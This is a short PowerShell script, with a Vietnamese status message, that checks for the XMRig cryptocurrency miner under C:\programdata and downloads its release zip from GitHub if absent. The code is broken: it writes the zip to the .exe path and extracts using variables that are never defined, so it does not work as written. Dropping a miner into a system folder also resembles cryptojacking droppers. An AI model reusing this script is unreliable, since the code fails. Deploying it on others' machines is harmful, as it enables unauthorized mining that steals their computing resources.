$filePath = "C:\programdata\xmrig-6.21.0-msvc-win64\xmrig-6.21.0\xmrig.exe"

if (-not (Test-Path $filePath)) {
    $url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip"
    Invoke-WebRequest -Uri $url -OutFile $filePath

    Expand-Archive -Path $zipFilePath -DestinationPath $extractPath

} else {
    echo "File da ton tai"
}


